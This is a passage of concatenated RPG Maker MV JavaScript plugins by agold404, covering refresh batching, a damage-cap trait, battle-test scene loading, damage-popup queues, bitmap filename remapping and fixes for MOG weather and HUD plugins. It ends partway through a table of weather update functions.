 * @plugindesc reduce refresh
 * @author agold404
 * 
 * @help reduce refresh
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=SceneManager;
p._needRefreshes_isRefreshing=false;
p.NOT_REFRESHED={};
new cfc(p).add('renderScene',function f(){
	const sc=this._scene;
	const set=sc&&sc._needRefreshes;
	if(set){
		const set2=sc._needRefreshes_notYet=[];
		this._needRefreshes_isRefreshing=true;
		set.slice().forEach(f.tbl[0]);
		this._needRefreshes_isRefreshing=false;
		set.uniqueClear();
		sc._needRefreshes=set2;
	}
	return f.ori.apply(this,arguments);
},[
// sp=>sp.refresh_do()===SceneManager.NOT_REFRESHED && SceneManager._scene._needRefreshes_notYet, // discard if can't refresh
sp=>sp.refresh_do(),
]).add('addRefresh',function f(obj,forcePending){
	if(!obj||(typeof obj.refresh_do!=='function')) return console.warn('got unsupported obj',obj);
	const sc=this._scene; if(!sc) return;
	if(!forcePending&&f.tbl[0].has(sc.constructor)) return obj.refresh_do();
	// added pending during refreshing
	if(this._needRefreshes_isRefreshing) return obj.refresh_do();
	let s=sc._needRefreshes; if(!s) s=sc._needRefreshes=[];
	s.uniquePush(obj);
},[
new Set([Scene_Map,]), // disable pending refresh scenes
],true,true);
}


{ const p=Sprite.prototype;
p.refresh_do=p._refresh;
}


{ const p=Window_BattleStatus.prototype;
['refresh','redrawATB',].forEach(k=>{
p[k+'_do']=p[k+'_do']||p[k];
});
}

})();


﻿"use strict";
/*:
 * @plugindesc gotGmgLim 受擊傷害上限
 * @author agold404
 * @help 有 trait 的 note <受擊傷害上限:數字>
 * 有多個時取最小。僅套用"傷害"。輸入負值會很好玩。
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;

const kw='受擊傷害上限';
const kwt='TRAIT_'+kw;
const kwget='get_'+kw;
const kwgetMin='getMin_'+kw;
gbb.addEnum(kwt);

t=[kwgetMin,kwget,gbb[kwt],kw,kwt,];

new cfc(Scene_Boot.prototype).add('start',function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	let ts=dataobj.traits,c,t; if(!ts) ts=dataobj.traits=[];
	const n=meta[kw]-0; if(isNaN(n)) return;
	ts.push({code:gbb[kwt],dataId:0,value:n,});
},
]);

new cfc(Game_Battler.prototype).add(kwget,function f(){
	return this.traits(f.tbl[2]);
},t).add(kwgetMin,function f(item){
	const arr=this[f.tbl[1]]();
	let rtv=Infinity;
	for(let x=arr.length;x--;) rtv=Math.min(rtv,arr[x].value);
	return rtv;
},t);

new cfc(Game_Action.prototype).add('executeDamage',function f(trgt,val){
	if(this.isDamage()) arguments[1]=Math.min(val,trgt[f.tbl[0]]());
	return f.ori.apply(this,arguments);
},t);

})();


﻿"use strict";
/*:
 * @plugindesc This plugin extends [SV]overlay slot via providing developers writting down overlay ID in note
 * @author agold404
 *
 * @help 本插件提供：覆寫狀態的 overlay 。
 * 
 * 狀態note區 <overlay:404>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype,tune=stat=>{ if(!stat) return;
	const n=Number(stat.meta.overlay-0);
	if(!isNaN(n)) stat.overlay=n;
};
k='start';
r=p[k]; (p[k]=function f(){
	f.ori.apply(this,arguments);
	$dataStates.forEach(tune);
}).ori=r;
}

})();


"use strict";
/*:
 * @plugindesc 原廠的思考模式跟一般人不一樣
 * @author agold404
 *
 * @help 我懶得寫說明
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;


{ // error msg
new cfc(SceneManager).add('catchException',function f(e){
	if(e instanceof Error){
		Graphics.printError(e.name, e.message, e);
		console.error(e.stack);
	}else{
		Graphics.printError('UnknownError', e, e && e.error);
	}
	AudioManager.stopAll();
	this.stop();
},t,false,true).add('onError',function f(e){
	console.error(e.message);
	console.error(e.filename, e.lineno);
	try{
		this.stop();
		Graphics.printError('Error', e.message, e.error);
		AudioManager.stopAll();
	}catch(_){}
},t,false,true);
} // error msg


{ // 多1場景(至少多1幀)來讀其他東西

new cfc(Scene_Boot.prototype).add('create',function f(){
	const q=ImageManager._parseQs(location.href);
	const troopId=q.troop-0;
	let isBTest;
	if(!isNaN(troopId)){
		DataManager._webTestTroopId=troopId;
		isBTest=DataManager.isBattleTest;
		DataManager.isBattleTest=f.tbl[0];
	}
	const rtv=f.ori.apply(this,arguments);
	if(isBTest) DataManager.isBattleTest=isBTest;
	return rtv;
},[
none,
]);
{ const p=DataManager;
const tune=[
function(scC){ const sm=SceneManager,k='goto';
	cf(SceneManager,k,function f(sc){
		if(f.tbl[0].has(sc)) sc=scC;
		arguments[0]=sc;
		this[k]=this[k].ori;
		{
			const t='initCommandPosition';
			cf(Window_TitleCommand,t,function f(){ this[f.tbl[0]]=this[f.tbl[0]].ori; },[t]);
		}
		return f.ori.apply(this,arguments);
	},[new Set([Scene_Battle,Scene_Map,Scene_Title,]),]);
},
],tmp=new Map();
k='setupBattleTest';
r=p[t=k+'_ori']; (p[k+'_ori']=p[k]).ori=r;
r=p[k]; (p[k]=function f(){
	// to see the original function content, see 'setupBattleTest_ori';
	if(!isNaN(DataManager._webTestTroopId)) $dataSystem.testTroopId=DataManager._webTestTroopId;
	f.tbl[0](Scene_Boot_LoadCustom_Battle);
}).ori=r;
p[k].tbl=tune;
tmp.set(k,t);
k='setupEventTest';
r=p[t=k+'_ori']; (p[k+'_ori']=p[k]).ori=r;
r=p[k]; (p[k]=function f(){
	// to see the original function content, see 'setupEventTest_ori';
	f.tbl[0](Scene_Boot_LoadCustom_Map);
}).ori=r;
p[k].tbl=tune;
tmp.set(k,t);
k='setupNewGame';
r=p[t=k+'_ori']; (p[k+'_ori']=p[k]).ori=r;
r=p[k]; (p[k]=function f(){
	// to see the original function content, see 'setupNewGame_ori';
	f.tbl[0](Scene_Boot_LoadCustom_Title);
	this[f._key]=f.ori;
/*
	if(f._strt) f.ori.apply(this,arguments);
	else{
		f.tbl[0](Scene_Boot_LoadCustom_Title);
		f._strt=true;
	}
*/
}).ori=r;
p[k].tbl=tune;
p[k]._key=k;
tmp.set(k,t);
// 
t=tmp;
}

{ const n='Scene_Boot_LoadCustom_Battle';
const a=window[n]=function(){ this.initialize.apply(this, arguments); }
const p=a.prototype = Object.create(Scene_Base.prototype);
p.constructor = a;
r=p.start=function f(){
	const q=ImageManager._parseQs(location.href);
	const troopId=q.troop-0;
	if(!isNaN(troopId)) $dataSystem.testTroopId=troopId;
	DataManager[f.tbl.get('setupBattleTest')]();
	SceneManager.goto(Scene_Battle);
};
r.ori=undefined;
r.tbl=t;
}

{ const n='Scene_Boot_LoadCustom_Map';
const a=window[n]=function(){ this.initialize.apply(this, arguments); }
const p=a.prototype = Object.create(Scene_Base.prototype);
p.constructor = a;
r=p.start=function f(){
	DataManager[f.tbl.get('setupEventTest')]();
	SceneManager.goto(Scene_Map);
};
r.ori=undefined;
r.tbl=t;
}

{ const n='Scene_Boot_LoadCustom_Title';
const a=window[n]=function(){ this.initialize.apply(this, arguments); }
const p=a.prototype = Object.create(Scene_Base.prototype);
p.constructor = a;
r=p.start=function f(){
	DataManager[f.tbl.get('setupNewGame')]();
	SceneManager.goto(Scene_Title);
	Window_TitleCommand.initCommandPosition();
};
r.ori=undefined;
r.tbl=t;
}

t=undefined;
} // 多1場景(至少多1幀)來讀其他東西


{ // 支援前場景暫存恢復+確保下個場景要預讀的東西好了 // ImageManager.isReady()
new cfc(SceneManager).add('push',function f(sceneClass,shouldRecordCurrentScene){
	this._stack.push(this._scene.constructor);
	this.goto(sceneClass,shouldRecordCurrentScene);
	if(shouldRecordCurrentScene && this._nextScene) this._nextScene._prevScene=this._scene;
	return this._nextScene && this._nextScene._prevScene;
},undefined,true,true).add('changeScene',function f(){
	if(this.isSceneChanging() && !this.isCurrentSceneBusy() && ImageManager.isReady()){
		let recordedPrevScene;
		if(this._scene){
			if(!this._nextScene||!this._nextScene._prevScene){
				this._scene.terminate();
				this._scene.detachReservation();
			}
			this._previousClass = this._scene.constructor;
			recordedPrevScene = this._scene._prevScene;
		}
		if(recordedPrevScene && this._nextScene && recordedPrevScene.constructor===this._nextScene.constructor){
			this._nextScene = null;
			(this._scene=recordedPrevScene)._active=true;
		}else{
			this._scene = this._nextScene;
			if(this._scene){
				this._scene.attachReservation();
				this._scene.create();
				this._nextScene = null;
				this._sceneStarted = false;
				this.onSceneCreate();
			}
		}
		if(this._exiting){
			if(f.tbl[0]){
				--f.tbl[0];
				this.terminate();
			}
		}
	}
},[
3, // max call count of 'this.terminate();'
],true,true);
} // 支援前場景暫存恢復+確保下個場景要預讀的東西好了


{ // 處理傷害數字lag

{ const n='Sprite_Damageset';
const a=window[n]=function(){ this.initialize.apply(this, arguments); }
const p=a.prototype = Object.create(Sprite.prototype);
p.constructor = a;
for(let ki=0,kv=['addChildAt','removeChildAt','setChildIndex','swapChildren',];ki!==kv.length;++ki){
k=kv[ki];
new cfc(p).add(k,function f(){
	console.warn('not supported: '+f.tbl[0]);
},[
k,
],false,true);
}
new cfc(p).add('update',function f(){
	f.ori.apply(this,arguments);
	return f.ori.apply(this,arguments);
}).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.children=new Queue(64);
	return rtv;
}).add('renderCanvas',function f(renderer){
	if(!this.visible || this.worldAlpha <= 0 || !this.renderable) return;
	this.children.forEach(f.tbl[0],renderer);
},[
function(sp){ sp.renderCanvas(this); },
],false,true).add('renderWebGL',function f(renderer){
	if(!this.visible || this.worldAlpha <= 0 || !this.renderable) return;
	this.children.forEach(f.tbl[0],renderer);
},[
function(sp){ sp.renderWebGL(this); },
],false,true).add('removeChild',function f(child,dontTryMore){
	if(this.children[0]!==child){
		if($gameTemp.isPlaytest()) console.warn('removeChild: child not the first');
		if(child) child.visible=false;
		return;
	}
	
	child.parent = null;
	child.transform._parentID = -1;
	this.children.pop();
	this._boundsID++;
	
	this.onChildrenChange(0);
	child.emit('removed', this);
	
	if(!dontTryMore) for(let tmp;(tmp=this.children[0]) && tmp.isPlaying && tmp.isPlaying.constructor===Function && !this.children[0].isPlaying();) this.removeChild(tmp,true);
	return child;
},undefined,false,true).add('updateTransform',function f(renderer){
	this._boundsID++;
	
	this.transform.updateTransform(this.parent.transform);
	
	// TODO: check render flags, how to process stuff here
	this.worldAlpha = this.alpha * this.parent.worldAlpha;
	
	this.children.forEach(f.tbl[0]);
},[
function(child){ child.visible && child.updateTransform(); },
],false,true);
}

new cfc(BattleManager).add('setDamageset',function f(sp){
	return this._dmgset=sp;
},undefined,true,true);

new cfc(Scene_Battle.prototype).add('createDisplayObjects',function f(){
	const rtv=f.ori.apply(this,arguments);
	const ds=this._dmgset=new Sprite_Damageset();
	//this.addChildAt(ds,this.getChildIndex(this._spriteset));
	this._spriteset.addChild(ds);
	BattleManager.setDamageset(ds);
	return rtv;
});

new cfc(Sprite_Damage.prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._stackYR=0; // use and clear when 'update';
	return rtv;
}).add('update',function f(){
	if(this._stackYR){
		this.y+=this._stackYR*this.digitHeight();
		this._stackYR=0;
	}
	return f.ori.apply(this,arguments);
});

{ const p=Sprite_Battler.prototype;
Object.defineProperty(p,'_damages',{ // change to Queue // debug: find who will access, and for what
get:function(){
	return this.__dmgs;
},
set:function(rhs){
	if(rhs instanceof Array) rhs=new Queue(rhs);
	return this.__dmgs=rhs;
},
});
new cfc(p).add('getDamagePopupContainer',function f(){
	if(!this.__dmgs) this.__dmgs=new Queue();
	return this.__dmgs;
},undefined,true,true).add('pushDamageSprite',function f(sprite){
	const yepParam=typeof Yanfly!=='undefined' && Yanfly.Param;
	const heightBuffer = yepParam && Yanfly.Param.BECPopupOverlap || 1;
	const container=this.getDamagePopupContainer();
	container.push(sprite);
	if(yepParam && Yanfly.Param.BECNewPopBottom) container.forEach(f.tbl[0], heightBuffer);
	else sprite._stackYR-=heightBuffer*container.length;
},[
function(sp){ sp._stackYR-=this; },
],false,true).add(k='setupDamagePopup',function f(){
	const btlr=this._battler;
	if(btlr.isDamagePopupRequested()){
		do{
			if(btlr.isSpriteVisible()){
				const sprite = new Sprite_Damage();
				sprite.x = this.x + this.damageOffsetX();
				sprite.y = this.y + this.damageOffsetY();
				sprite.setup(btlr);
				this.pushDamageSprite(sprite);
				BattleManager._dmgset.addChild(sprite);
			}
			if(btlr._damagePopup===true) btlr.clearDamagePopup();
			btlr.clearResult();
		}while(btlr.isDamagePopupRequested());
	}else btlr.clearDamagePopup();
},false,true);
delete Sprite_Actor.prototype[k];
new cfc(p).add('updateDamagePopup',function f(){
	const btlr=this._battler,container=this.getDamagePopupContainer();
	for(let len=container.length;;){
		this.setupDamagePopup();
		if(len===container.length) break;
		len=container.length;
	}
	// container.forEach(f.tbl[0]); // already in dmgset
	while(container.length && !container[0].isPlaying()){
		if(container[0].parent) container[0].parent.removeChild(container[0]); // will be removed somewhere in YEP ; AN DOUBLE REMOVE!
		container.shift();
	}
},[
sp=>sp.update(),
],false,true);
}

} // 處理傷害數字lag


{ // $dataAnimations[n].timings ; update _duration

new cfc(Sprite_Animation.prototype).add('findTimingData',function f(frameIndex){
	const tms=this._animation.timings;
	if(!tms._map) tms.forEach(f.tbl[0],tms._map=new Map());
	return tms._map.get(frameIndex);
},[
function(timing){
	let arr=this.get(timing.frame); if(!arr) this.set(timing.frame,arr=[]);
	arr.push(timing);
},
]).add('updateFrame',function f(){
	if(this._duration>0){
		const frameIndex = this.currentFrameIndex();
		this.updateAllCellSprites(this._animation.frames[frameIndex]);
		const arr=this.findTimingData(frameIndex);
		if(arr) arr.forEach(f.tbl[0],this);
	}
},[
function(timing){ this.processTimingData(timing); },
],true,true).add('updateMain',function f(){
	if(this.isPlaying()){
		if(0<this._delay) --this._delay;
		else{
			--this._duration;
			//if(this.isReady()) ;
			this.updatePosition();
			if(this._duration % this._rate === 0) this.updateFrame();
		}
	}
},undefined,true,true).add('setupRate',function f(settingData){
	this._rate=this.calcRate(settingData);
},true,true).add('calcRate',function f(settingData){
	let rtv=settingData&&settingData.rate;
	if(isNaN(rtv)) rtv=4;
	return rtv-0;
}).add('calcDuration',function f(settingData){
	const ani=$dataAnimations[settingData.animationId];
	if(!ani) return 0;
	return ani.frames.length * this.calcRate(settingData) + 1;
}).add('calcTotalFrames',function f(settingData){
	return settingData.delay+this.calcDuration(settingData);
});

} // $dataAnimations[n].timings



{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	
	if(DataManager.isBattleTest())
	if(this._setupBtestData) DataManager[f.tbl[0]]();
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
t=function f(sc){
	if(sc!==Scene_Title) sc=Scene_Boot_LoadCustom;
	arguments[0]=sc;
	const rtv=f.ori.apply(this,arguments);
	
},
];
t.ori=SceneManager.goto;
t=undefined;
}


{ // traits
new cfc(Game_BattlerBase.prototype).add('traitsSet',function f(code){
	// 會重複就ㄅ叫setㄌ好ㄇ
	return [].uniquePushContainer(this.traits(code).map(f.tbl[0]));
},[
t=>t.dataId,
],true,true);
} // traits


{ const p=Game_Battler.prototype;
k='isStateAddable';
r=p[k]; (p[k]=function(stateId){
	return (this.isAlive() && $dataStates[stateId] &&
		!this.isStateResist(stateId) &&
		// !this._result.isStateRemoved(stateId) &&
		!this.isStateRestrict(stateId));
}).ori=r;
}


{ const p=Game_Action.prototype;
k='gainDrainedHp';
r=p[k]; (p[k]=function f(value){
	if(this.isDrain()){
		let gainTarget=this.subject();
		if(this._reflectionTarget!==undefined) gainTarget = this._reflectionTarget;
		gainTarget.gainHp(value);
		return gainTarget;
	}
}).ori=r;
k='gainDrainedMp';
r=p[k]; (p[k]=function f(value){
	if(this.isDrain()){
		let gainTarget=this.subject();
		if(this._reflectionTarget!==undefined) gainTarget = this._reflectionTarget;
		gainTarget.gainMp(value);
		return gainTarget;
	}
}).ori=r;
}


{ // 合併 Scene_Map 和 Scene_Battle 的 createMessageWindow

const k='createMessageWindow';
const arr=[Scene_Map,Scene_Battle,];
const tbl=new Map(); for(let x=0,xs=arr.length;x!==xs;++x) tbl.set(arr[x],arr[x].prototype[k]);
new cfc(Scene_Base.prototype).add('createMessageWindow_merged',function f(){
	return f.tbl.get(this.constructor).apply(this,arguments); // should throw error if not found
},tbl,false,true);
const f=function f(){
	return Scene_Base.prototype.createMessageWindow_merged.apply(this,arguments);
};
arr.forEach(a=>new cfc(a.prototype).add('createMessageWindow',f,undefined,false,true));

} // 合併 Scene_Map 和 Scene_Battle 的 createMessageWindow


})();


"use strict";
/*:
 * @plugindesc remapping filename ; ImageManager.loadBitmap / ImageManager.reserveBitmap : special uri on arg:'filename' ( dataURI , /^\.\/\// , ... ? ) will treat arg:'folder' as empty string
 * @author agold404
 *
 * @help 我懶得寫說明
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_System.prototype;
k='_bmpRemap_container';
r=p[k]; (p[k]=function f(){
	let arr=this._bmpRemap; if(!arr) arr=this._bmpRemap=[];
	let m=arr._map; if(!m) m=arr._map=new Map(arr.map(f.tbl[0]));
	return arr;
}).ori=r;
p[k].tbl=[
(x,i)=>[x[0],[i,x[1]]],
];
k='bmpRemap_set';
r=p[k]; (p[k]=function f(ori,mapped){
	const arr=this._bmpRemap_container();
	const m=arr._map; // ori -> [idx,mapped,]
	const info=m.get(ori);
	if(mapped){
		// set mapping
		if(info){
			const msg="[WARNING]\n img:\n"+ori+"\n is already mapping to:\n"+(info&&info[1]);
			console.warn(msg);
			alert(msg);
		}
		m.set(ori,[arr.length,mapped,]);
		arr.push([ori,mapped]);
	}else if(info){
		// remove
		if(info[0]!==arr.length){
			// move last to here
			const back=arr[info[0]]=arr.back;
			m.set(back[0],[info[0],back[1],]);
		}
		arr.pop();
		return m.delete(ori);
	}
}).ori=r;
k='bmpRemap_get';
r=p[k]; (p[k]=function f(path){
	const m=this._bmpRemap_container()._map;
	const rtv=m.get(path);
	return rtv&&rtv[1]||path;
}).ori=r;
k='bmpRemap_clear';
r=p[k]; (p[k]=function f(path){
	const arr=this._bmpRemap_container();
	arr.length=0;
	const m=arr._map;
	m.clear();
}).ori=r;
}

{ const p=ImageManager;
(t=p.isDirectPath=function f(fname){
	return fname && fname.constructor===String && f.tbl.some(p=>fname.match(p));
}).ori=undefined;
t.tbl=[/^(data:|\.\/\/)/,];
p.splitUrlQueryHash=path=>{ if(!path) return ['','',''];
	const idx_sharp=path.indexOf("#");
	const rtv=idx_sharp<0?[path,'','',]:[path.slice(0,idx_sharp),'',path.slice(idx_sharp),];
	const idx_question=rtv[0].indexOf("?");
	if(idx_question>=0){
		rtv[1]=rtv[0].slice(idx_question);
		rtv[0]=rtv[0].slice(0,idx_question);
	}
	return rtv;
}
k='_loadBitmap';
r=p[k]; (p[k]=function(isReserve, folder, filename, hue, smooth, reservationId){
	if(filename){
		let path;
		if(this.isDirectPath(filename)) path=filename;
		else{
			path = folder + filename.replace(/\n/g,'%0A');
			const uqh=this.splitUrlQueryHash(path);
			uqh[0]+='.png'; // 
			if($gameSystem) uqh[0]=$gameSystem.bmpRemap_get(uqh[0]);
			path=uqh.join('');
		}
		const bitmap = isReserve ? this.reserveNormalBitmap(path, hue || 0, reservationId || this._defaultReservationId) : this.loadNormalBitmap(path, hue || 0);
		bitmap.smooth = smooth;
		return bitmap;
	}else return this.loadEmptyBitmap();
}).ori=r;
k='loadBitmap';
r=p[k]; (p[k]=function(folder, filename, hue, smooth){
	return this._loadBitmap(false, folder, filename, hue, smooth);
}).ori=r;
k='reserveBitmap';
r=p[k]; (p[k]=function(folder, filename, hue, smooth, reservationId){
	return this._loadBitmap(true , folder, filename, hue, smooth, reservationId);
}).ori=r;
k='loadNormalBitmap';
r=p[k]; (p[k]=function(path, hue){
	const key = this._generateCacheKey(path, hue);
	let bitmap = this._imageCache.get(key);
	if(!bitmap){
		this._imageCache.add(key, bitmap = Bitmap.load(path));
		bitmap.addLoadListener(()=>bitmap.rotateHue(hue));
	}else if(!bitmap.isReady()) bitmap.decode();
	return bitmap;
}).ori=r;
}

})();


"use strict";
/*:
 * @plugindesc 改變部分 Window_* 的功能
 * @author agold404
 *
 * @help 我懶得寫說明
 * 
 * This plugin can be renamed as you want.
 */

// rpg_windows__edit

(()=>{ let k,r;

{ const p=Window_Base.prototype;
p.hpCostColor=p.hpGaugeColor2;
}

{ const p=Window_SkillList.prototype;
k='drawSkillCost';
r=p[k]; (p[k]=function f(skill, x, y, width){
	const tuneVal=(typeof Yanfly==='undefined')?x=>x:Yanfly.Util.toGroup;
	let tmp;
	// width is the width of the skill's item rect
	x+=width;
	width>>=1;
	if((tmp=~~this.textWidth(f.key))<width) width=tmp;
	const w_4=width>>2;
	const d=(width>>3)+w_4;
	x-=w_4;
	let nextPad=0;
	if(tmp=this._actor.skillTpCost(skill)){
		this.changeTextColor(this.tpCostColor());
		this.drawText(tuneVal(tmp), x+nextPad, y, w_4, 'right');
		nextPad-=d;
	}
	if(tmp=this._actor.skillMpCost(skill)){
		this.changeTextColor(this.mpCostColor());
		this.drawText(tuneVal(tmp), x+nextPad, y, w_4, 'right');
		nextPad-=d;
	}
	if( this._actor.skillHpCost && (tmp=this._actor.skillHpCost(skill)) ){
		this.changeTextColor(this.hpCostColor());
		this.drawText(tuneVal(tmp), x+nextPad, y, w_4, 'right');
		nextPad-=d;
	}
	return x+nextPad;
}).ori=r;
if(typeof Window_SkillListM!=='undefined') Window_SkillListM.prototype[k]=p[k];
}

})();


﻿"use strict";
/*:
 * @plugindesc MOG=大便 (程式方面)
 * @author agold404
 * @help 不服來辨，趁我記得
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

// merge 與原廠相同內容的函式
if(typeof Window_ItemListM!=='undefined'){
[
'makeItemList',
].forEach(k=>{
Window_ItemListM.prototype[k]=function f(){
	return Window_ItemList.prototype[k].apply(this,arguments);
};
});
}

// 未先判斷是否已給bitmap
if(typeof ActorStatusSkill!=='undefined'){ const p=ActorStatusSkill.prototype;
k='refresh';
r=p[k]; (p[k]=function f(){
	if(!this.bitmap) return;
	return f.ori.apply(this,arguments);
}).ori=r;
}

// 把 sprite 放 $gameSystem 也不會在對的時間清掉，到底是三小， state 爛掉就掰
// 幫call destroy
if(typeof Imported!=='undefined' && Imported.MOG_BattleTransitions) new cfc(Scene_Battle.prototype).add('terminate',function f(){
	$gameSystem._treSpriteData=undefined;
	return f.ori.apply(this,arguments);
}).add('removeTRSprites',function f(){
	const allSprites=new Set(this._spriteTrasition).union_inplaceThat(new Set($gameSystem._treSpriteData));
	const rtv=f.ori.apply(this,arguments);
	allSprites.forEach(f.tbl[0]);
	return rtv;
},[
sp=>sp.destroy(true),
]);

// 重新合併 Game_(Actor/Enemy).prototype.gain*p
{ const aa=Game_Actor,ea=Game_Enemy;
const ap=aa.prototype,ep=ea.prototype;
const arr=['gainHp','gainMp','gainTp',];
for(let x=0;x!==arr.length;++x){
const k=arr[x];
t=[k+"_merged"];
// base
cf(Game_Battler.prototype,t[0],function f(val){
	const func=f.tbl[0].get(this.constructor);
	if(func){
		const acc=this.accumulateGains_get();
		if(acc) acc[f.tbl[1]]+=val;
		return func.apply(this,arguments);
	}else console.warn("not found",f.tbl[1],"for",this.constructor.name);
},[
new Map([
	[aa,ap[k]],
	[ea,ep[k]],
]),
k,
]);
// call the base
const f=function f(){
	return Game_Battler.prototype[f.tbl[0]].apply(this,arguments);
};
cf(ap,k,f,t,true,true);
cf(ep,k,f,t,true,true);
} // for
new cfc(Game_Battler.prototype).add('accumulateGains_init',function f(){
	const rtv=this._accumulateGains={};
	for(let x=0;x!==arr.length;++x) rtv[arr[x]]=0;
	return rtv;
},arr).add('accumulateGains_del',function f(){
	return this._accumulateGains=undefined;
},arr).add('accumulateGains_get',function f(){
	return this._accumulateGains;
},arr);
}

// 你要在奇怪的時間點 call refresh 你就要判裡面東西好了沒啊
if(typeof PartyWindowData==='function'){
new cfc(PartyWindowData.prototype).add('refreshPar',function f(){
	if(!this._par||!this._par.bitmap) return;
	return f.ori.apply(this,arguments);
}).add('refreshPMeter',function f(img,meter,keyCurr,keyMax){
	if(!img||!meter||!this._actor) return;
	const cw = img.width;
	const ch = img.height;
	const wid = cw * this._actor[keyCurr] / this._actor[keyMax];
	return meter.setFrame(0,0,wid,cw);
}).add('refreshHPMeter',function f(){
	return this.refreshPMeter(this._hpMeterImg,this._hpMeter,'hp','mhp');
}).add('refreshMPMeter',function f(){
	return this.refreshPMeter(this._mpMeterImg,this._mpMeter,'mp','mmp');
}).add('refresh_states',function f(){
	if(!this._states_data||!this._state_icon) return;
	return f.ori.apply(this,arguments);
});
}

// update知道要floor，create就不知道
if(typeof Battle_Hud!=='undefined'){
new cfc(Battle_Hud.prototype).add('refresh_number',function f(){
	arguments[1]|=0;
	return f.ori.apply(this,arguments);
});
}

})();


﻿"use strict";
/*:
 * @plugindesc Fix Glitch of plugin - MOG_Weather_EX in loopMap
 * @author agold404
 *
 * @help 還有多少插件要修，你們不能寫好嗎 QAQ
 */

// fixbug__MOG_Weather_EX__loopMapDisplayGlitch

if(typeof SpriteWeatherEX!=='undefined') SpriteWeatherEX.prototype.updateScroll = function(sprite) {
	let pr;
	if($dataMap && !(pr=$dataMap._threshold)){
		pr=$dataMap._threshold=[];
		pr[0]=($dataMap.width  -1)*$gameMap.tileWidth  (); pr[0]*=pr[0];
		pr[1]=($dataMap.height -1)*$gameMap.tileHeight (); pr[1]*=pr[1];
	}
	sprite._sx -= sprite._ani[1];
	sprite._sy -= sprite._ani[2];
	const displayX_tw=$gameMap.displayX() * $gameMap.tileWidth  ();
	const displayY_th=$gameMap.displayY() * $gameMap.tileHeight ();
	if(this._lastDisplayX_tw!==undefined){
		const dx=displayX_tw-this._lastDisplayX_tw; if(dx*dx>pr[0]) sprite._sx-=dx;
		const dy=displayY_th-this._lastDisplayY_th; if(dy*dy>pr[1]) sprite._sy-=dy;
	}
	sprite.origin.x = displayX_tw + sprite._sx;
	sprite.origin.y = displayY_th + sprite._sy;
	this._lastDisplayX_tw=displayX_tw;
	this._lastDisplayY_th=displayY_th;
};


﻿"use strict";
/*:
 * @plugindesc 修 MOG_Weather_EX.js 太卡ㄉ問題
 * @author agold404
 * @help 再不讀演算法及了解語言特性試試看?
 * 
 * This plugin can be renamed as you want.
 */

if('undefined'!==typeof SpriteWeatherEX)(()=>{ let k,r,t;

{ const p=SpriteWeatherEX.prototype;

k='createSprites';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	if(404<this._sprites.length) this._sprites.forEach(f.tbl,f.tbl); // reduce compute
	return rtv;
}).ori=r;
(p[k].tbl=function f(sp){
	if(sp.children.length) return;
	sp.update=f.tbl[0];
	sp.renderCanvas=f.tbl[1];
	if(sp.constructor===Sprite) sp._refresh=f.tbl[2];
}).tbl=[
none,
function(renderer){
	if(!this.visible || !this.renderable) return;
	const a=this.anchor,s=this.scale;
	const sx=s.x,sy=s.y;
	const xo=this.x,yo=this.y,ws=this.width*sx,hs=this.height*sy;
	let x=sx<0?xo+ws*a.x:xo-ws*a.x,xe=x+ws; if(xe<x){ let t=x; x=xe; xe=t; }
	let y=sy<0?yo+hs*a.y:yo-hs*a.y,ye=y+hs; if(ye<y){ let t=y; y=ye; ye=t; }
	if(x>=Graphics._boxWidth||xe<0||y>=Graphics._boxHeight||ye<0) return; // out-of-bound
	if(!(0<this.worldAlpha)) return;
	
	this._renderCanvas(renderer);
},
function f(){
	SceneManager.addRefresh(this,true);
},
];

k='updateEffects';
r=p[k]; (p[k]=function f(sprite){
	const func=f.tbl[this.mode()]||f.tbl._undef;
	func.call(this,sprite);
	sprite._wait = this.data().wait;
}).ori=r;
p[k].tbl=t=[
p.updateWind,
p.updateWind,
p.updateWind3,
p.updateSpark,
p.updateSpark2,
p.updateSpark3,
p.updateFire,
p.updateFire,
p.updateFire3,
p.updateSnow,
p.updateSnow,
p.updateSnow3,
p.updateRain1,
p.updateRain2,
p.updateRain3,
p.updateCloud1,
p.updateCloud2,
p.updateCloud3,
p.updateRandom1,
p.updateRandom2,
p.updateRandom3,
p.updateSunLight,
p.updateFog1,
p.updateFog1,
p.updateFog1,
p.updateStar1,
p.updateStar2,
p.updateShinning,
p.updateBounce,
p.updateSpark4,
p.updateBubble,
p.updateStandStill,
p.updateScroll,
p.updateScroll,
p.updateParallax1,
p.updateParallax2,
];
t._undef=p.updateRandom1;

k='refreshWeather';
r=p[k]; (p[k]=function f(sprite,initial){
	const func=f.tbl[this.mode()]||f.tbl._undef;
	func.call(this,sprite,initial);
	if(initial){
		if($gameParty.inBattle()){
			if(window.Imported && Imported.MOG_BattleCameraFrontal) this.setFrontalCamera();
			if(window.Imported && Imported.MOG_BattleCamera) this.setCamScreen();
		}
		sprite._ani[6] = 5;
		if(this.needInitialRandomPos()) this.setPosRandom(sprite);
		this.updateEffects(sprite);
	}else{
		if(sprite._ani[6] > 0) sprite._ani[7] = Math.random()*120;
	}
}).ori=r;
p[k].tbl=t=[
